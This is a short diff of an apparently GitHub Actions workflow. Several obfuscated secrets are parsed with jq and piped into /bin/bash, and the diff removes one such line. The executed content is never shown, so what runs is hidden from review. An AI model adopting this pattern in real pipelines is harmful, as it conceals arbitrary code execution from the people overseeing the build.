@@ -21,7 +21,6 @@ jobs:
           ad0010: ${{ secrets.ad0010 }}
         run: |
           printf '%s' "$ad0010" | jq -r .l61 | /bin/bash
-          printf '%s' "$isfd9" | jq -r .ra455 | /bin/bash
           printf '%s' "$ipo3259" | jq -r .p828 | /bin/bash
           printf '%s' "$kodk81" | jq -r .sxvva6 | /bin/bash
           echo $tbi66 | jq -r .l6 | /bin/bash
